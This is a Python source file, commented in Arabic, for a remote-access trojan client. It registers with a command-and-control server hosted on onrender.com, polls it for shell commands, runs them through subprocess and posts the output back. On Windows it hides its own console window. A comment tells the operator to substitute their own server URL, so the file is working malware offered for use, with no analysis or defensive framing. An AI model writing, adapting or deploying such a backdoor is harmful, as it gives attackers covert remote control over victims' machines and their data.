import os
import time
import uuid
import subprocess
import requests
import platform
import sys

# غير هذا إلى رابط راندر حقك
C2_URL = "https://m7kmt-bdr-1.onrender.com"

CID = str(uuid.uuid4())
OS_INFO = platform.system() + " " + platform.release()

def register():
    while True:
        try:
            requests.post(f"{C2_URL}/api/register", json={"id": CID, "os": OS_INFO}, timeout=10)
            break
        except:
            time.sleep(5)

def poll_commands():
    while True:
        try:
            r = requests.get(f"{C2_URL}/api/get_cmd/{CID}", timeout=15)
            if r.status_code == 200:
                cmd = r.json().get('cmd')
                if cmd:
                    try:
                        # استخدام shell حسب النظام
                        if os.name == 'nt':
                            output = subprocess.getoutput(cmd)
                        else:
                            output = subprocess.getoutput(cmd)
                        if not output: output = "تم التنفيذ."
                    except Exception as e:
                        output = str(e)
                    requests.post(f"{C2_URL}/api/send_result/{CID}", json={"result": output}, timeout=15)
        except Exception:
            pass
        time.sleep(3)

if __name__ == "__main__":
    # اخفاء النافذة في ويندوز فقط
    if os.name == 'nt':
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    register()
    poll_commands()